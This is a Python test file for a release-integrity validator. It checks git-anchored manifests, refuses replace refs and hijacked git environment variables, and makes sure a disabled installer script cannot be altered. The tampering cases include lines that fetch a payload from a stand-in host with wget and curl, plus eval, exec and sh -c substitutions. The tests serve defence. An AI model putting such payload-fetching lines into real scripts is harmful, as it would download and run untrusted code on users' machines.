from __future__ import annotations

from copy import deepcopy
import hashlib
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest
from unittest.mock import patch


SCRIPTS = Path(__file__).resolve().parent
ROOT = SCRIPTS.parent
sys.path.insert(0, str(SCRIPTS))

import build_immutable_manifest as manifest_builder
import validate_repo


def _git_fixture(repository: Path, *args: str, input_bytes: bytes | None = None) -> bytes:
    completed = subprocess.run(
        [
            "git",
            "--no-replace-objects",
            f"--git-dir={repository / '.git'}",
            f"--work-tree={repository}",
            *args,
        ],
        input=input_bytes,
        check=True,
        capture_output=True,
        env={
            "GIT_CONFIG_GLOBAL": os.devnull,
            "GIT_CONFIG_NOSYSTEM": "1",
            "LC_ALL": "C",
            "PATH": os.environ.get("PATH", ""),
        },
    )
    return completed.stdout


def _fixture_commit(repository: Path, content: bytes) -> str:
    blob = _git_fixture(repository, "hash-object", "-t", "blob", "-w", "--stdin", input_bytes=content)
    release_tree = _git_fixture(
        repository,
        "mktree",
        input_bytes=b"100644 blob " + blob.strip() + b"\tartifact\n",
    )
    root_tree = _git_fixture(
        repository,
        "mktree",
        input_bytes=b"040000 tree " + release_tree.strip() + b"\trelease\n",
    )
    commit = (
        b"tree "
        + root_tree.strip()
        + b"\nauthor Fixture <fixture@example.invalid> 0 +0000"
        + b"\ncommitter Fixture <fixture@example.invalid> 0 +0000"
        + b"\n\nfixture\n"
    )
    return _git_fixture(
        repository, "hash-object", "-t", "commit", "-w", "--stdin", input_bytes=commit
    ).decode("ascii").strip()


class ImmutableManifestTests(unittest.TestCase):
    def test_publication_anchor_policies_are_intentionally_independent(self) -> None:
        expected = {
            "download/0.1.0-alpha.2": "4043534a9a1d56c51c3d47d0906e0520963af79c",
            "download/0.1.0-alpha.3": "52b42dd47a11510220f33690075f1b6773f6a889",
        }
        self.assertEqual(manifest_builder.PUBLICATION_ANCHORS, expected)
        self.assertEqual(validate_repo.VALIDATOR_PUBLICATION_ANCHORS, expected)
        self.assertIsNot(
            manifest_builder.PUBLICATION_ANCHORS,
            validate_repo.VALIDATOR_PUBLICATION_ANCHORS,
        )

    def test_git_reads_refuse_replace_refs_and_inherited_git_environment(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            repository = Path(temporary) / "repository"
            subprocess.run(
                ["git", "init", "--quiet", str(repository)],
                check=True,
                capture_output=True,
                env={
                    "GIT_CONFIG_GLOBAL": os.devnull,
                    "GIT_CONFIG_NOSYSTEM": "1",
                    "LC_ALL": "C",
                    "PATH": os.environ.get("PATH", ""),
                },
            )
            original = _fixture_commit(repository, b"publication bytes\n")
            replacement = _fixture_commit(repository, b"replacement bytes\n")
            _git_fixture(
                repository,
                "update-ref",
                f"refs/replace/{original}",
                replacement,
            )
            replaced = subprocess.run(
                [
                    "git",
                    f"--git-dir={repository / '.git'}",
                    f"--work-tree={repository}",
                    "show",
                    f"{original}:release/artifact",
                ],
                check=True,
                capture_output=True,
            ).stdout
            self.assertEqual(replaced, b"replacement bytes\n")

            bad_config = Path(temporary) / "invalid-gitconfig"
            bad_config.write_text("[invalid\n", encoding="utf-8")
            hostile_environment = {
                "GIT_CONFIG_COUNT": "1",
                "GIT_CONFIG_GLOBAL": str(bad_config),
                "GIT_CONFIG_KEY_0": "core.repositoryFormatVersion",
                "GIT_CONFIG_VALUE_0": "999",
                "GIT_DIR": str(Path(temporary) / "attacker.git"),
                "GIT_NO_REPLACE_OBJECTS": "0",
                "GIT_OBJECT_DIRECTORY": str(Path(temporary) / "attacker-objects"),
                "GIT_REPLACE_REF_BASE": "refs/replace",
                "GIT_WORK_TREE": str(Path(temporary) / "attacker-worktree"),
            }
            expected_sha256 = hashlib.sha256(b"publication bytes\n").hexdigest()
            with patch.dict(os.environ, hostile_environment, clear=False):
                generated = manifest_builder.anchored_files(
                    "release", original, root=repository
                )
                validated = validate_repo._anchored_files(
                    "release", original, root=repository
                )
            self.assertEqual(generated["artifact"]["sha256"], expected_sha256)
            self.assertEqual(validated["artifact"]["sha256"], expected_sha256)

    def test_manifest_matches_independent_builder_output(self) -> None:
        recorded = json.loads(
            (ROOT / "config/immutable-release-trees.json").read_text(encoding="utf-8")
        )
        self.assertEqual(recorded, manifest_builder.build_manifest())

    def test_tree_records_reject_path_byte_count_mode_and_git_metadata_drift(self) -> None:
        digest = hashlib.sha256(b"abc").hexdigest()
        recorded = {
            "artifact": {
                "bytes": 3,
                "gitMode": "100644",
                "gitType": "blob",
                "lstatMode": "100600",
                "sha256": digest,
            }
        }
        anchored = {
            "artifact": {
                "bytes": 3,
                "gitMode": "100644",
                "gitType": "blob",
                "sha256": digest,
            }
        }
        observed = {
            "artifact": {"bytes": 3, "lstatMode": "100600", "sha256": digest}
        }
        validate_repo._validate_tree_records("release", recorded, anchored, observed)

        cases: list[tuple[str, dict, dict, dict]] = []
        cases.append(("Deleted", recorded, anchored, {}))
        added = deepcopy(observed)
        added["extra"] = observed["artifact"]
        cases.append(("Added", recorded, anchored, added))
        changed_bytes = deepcopy(observed)
        changed_bytes["artifact"]["sha256"] = "0" * 64
        cases.append(("Byte change", recorded, anchored, changed_bytes))
        changed_count = deepcopy(observed)
        changed_count["artifact"]["bytes"] = 4
        cases.append(("Byte-count change", recorded, anchored, changed_count))
        changed_mode = deepcopy(observed)
        changed_mode["artifact"]["lstatMode"] = "100644"
        cases.append(("lstat mode change", recorded, anchored, changed_mode))
        changed_git_mode = deepcopy(recorded)
        changed_git_mode["artifact"]["gitMode"] = "100755"
        cases.append(("Manifest gitMode", changed_git_mode, anchored, observed))
        anchored_count = deepcopy(recorded)
        anchored_count["artifact"]["bytes"] = 4
        matching_observed = deepcopy(observed)
        matching_observed["artifact"]["bytes"] = 4
        cases.append(("Manifest bytes", anchored_count, anchored, matching_observed))

        for message, candidate, publication, current in cases:
            with self.subTest(message=message), self.assertRaisesRegex(AssertionError, message):
                validate_repo._validate_tree_records(
                    "release", candidate, publication, current
                )

    def test_current_tree_scan_rejects_symlinks_and_special_files(self) -> None:
        scanners = (manifest_builder.current_files, validate_repo._current_files)
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            release = root / "release"
            release.mkdir()
            artifact = release / "artifact"
            artifact.write_bytes(b"artifact")
            link = release / "link"
            link.symlink_to(artifact)
            for scanner in scanners:
                with self.subTest(scanner=scanner.__module__, node="symlink"):
                    with self.assertRaisesRegex(AssertionError, "symlink or special file"):
                        scanner("release", root=root)
            link.unlink()
            fifo = release / "fifo"
            os.mkfifo(fifo)
            for scanner in scanners:
                with self.subTest(scanner=scanner.__module__, node="fifo"):
                    with self.assertRaisesRegex(AssertionError, "symlink or special file"):
                        scanner("release", root=root)


class DisabledBootstrapTests(unittest.TestCase):
    def test_program_is_exact_and_rejects_effect_or_whitespace_variants(self) -> None:
        canonical = validate_repo.MUTABLE_DISABLED_BOOTSTRAP.encode("utf-8")
        validate_repo.validate_disabled_bootstrap_program(canonical)
        variants = (
            canonical + b"wget https://example.invalid/payload\n",
            canonical.replace(b"exit 2", b"eval 'exit 2'"),
            canonical.replace(b"exit 2", b"exec /bin/true"),
            canonical.replace(b"exit 2", b"sh -c 'exit 2'"),
            canonical.replace(b"printf '%s\\n'", b"/usr/bin/printf '%s\\n'"),
            canonical.replace(b"  '' \\\n", b" \t'' \\\n", 1),
            canonical.replace(b"exit 2\n", b"exit 2\ncurl example.invalid\n"),
        )
        for variant in variants:
            with self.subTest(variant=variant[-40:]), self.assertRaises(AssertionError):
                validate_repo.validate_disabled_bootstrap_program(variant)

    def test_program_syntax_and_behavior_need_no_external_command(self) -> None:
        installer = ROOT / "download/install.sh"
        environment = {"LC_ALL": "C", "PATH": "/nonexistent"}
        syntax = subprocess.run(
            ["/bin/sh", "-n", str(installer)],
            check=False,
            capture_output=True,
            env=environment,
        )
        self.assertEqual(syntax.returncode, 0, syntax.stderr.decode("utf-8"))
        completed = subprocess.run(
            ["/bin/sh", str(installer)],
            check=False,
            capture_output=True,
            env=environment,
        )
        self.assertEqual(completed.returncode, 2)
        self.assertEqual(completed.stdout, b"")
        self.assertEqual(
            completed.stderr,
            b"StatePort v0.1.0-alpha.3 installation is disabled.\n"
            b"\n"
            b"The signed candidate is byte-intact, but its freshness evidence has expired\n"
            b"and known installer and runtime defects require a successor release.\n"
            b"No installation command is executed by this disabled bootstrap.\n"
            b"\n"
            b"Wait for a corrected, rebuilt, and re-signed successor candidate.\n"
            b"Erratum: https://lennertvhoy.github.io/StatePort-Site/download/erratum-alpha3.html\n",
        )


class SourceDisclosureTests(unittest.TestCase):
    def test_current_source_disclosures_pass_and_stale_copy_is_rejected(self) -> None:
        texts = {
            page: page.read_text(encoding="utf-8")
            for page in validate_repo.mutable_public_pages()
        }
        validate_repo.validate_source_disclosures(texts)

        stale = dict(texts)
        releases = ROOT / "releases/index.html"
        stale[releases] += "<p>Product license not decided</p>"
        with self.assertRaisesRegex(AssertionError, "Stale pre-publication"):
            validate_repo.validate_source_disclosures(stale)

        conflated = dict(texts)
        download = ROOT / "download/index.html"
        conflated[download] = conflated[download].replace(
            "<dt>Canonical development Git</dt>", "<dt>Source</dt>"
        )
        with self.assertRaisesRegex(AssertionError, "separate"):
            validate_repo.validate_source_disclosures(conflated)


if __name__ == "__main__":
    unittest.main()
